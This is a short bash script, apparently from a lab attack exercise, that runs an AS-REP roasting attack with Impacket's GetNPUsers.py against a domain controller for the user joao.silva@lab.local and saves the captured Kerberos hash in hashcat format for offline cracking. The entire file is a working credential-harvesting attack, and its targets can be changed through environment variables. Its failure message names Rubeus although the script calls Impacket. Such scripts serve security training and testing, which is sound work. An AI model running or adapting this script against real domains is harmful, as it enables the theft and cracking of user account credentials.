#!/usr/bin/env bash
set -euo pipefail

DC_IP="${DC_IP:-172.30.0.10}"
DOMAIN="${DOMAIN:-lab.local}"
USER="joao.silva"
OUT="/opt/attacks/output"
mkdir -p "$OUT"

LOG="$OUT/01-asrep-roast.log"
echo "[*] Impacket AS-REP roast para ${USER}@${DOMAIN}" | tee "$LOG"
GetNPUsers.py "${DOMAIN}/${USER}" -no-pass -dc-ip "$DC_IP" \
    -format hashcat -outputfile "$OUT/asrep.hash" 2>&1 | tee -a "$LOG" || true

grep -oE '\$krb5asrep\$[^[:space:]]+' "$LOG" >> "$OUT/asrep.hash" || true
if [ -s "$OUT/asrep.hash" ]; then
    echo '[+] Hash AS-REP capturado:'
    cat "$OUT/asrep.hash"
else
    echo '[!] Rubeus não retornou hash AS-REP'
    exit 1
fi
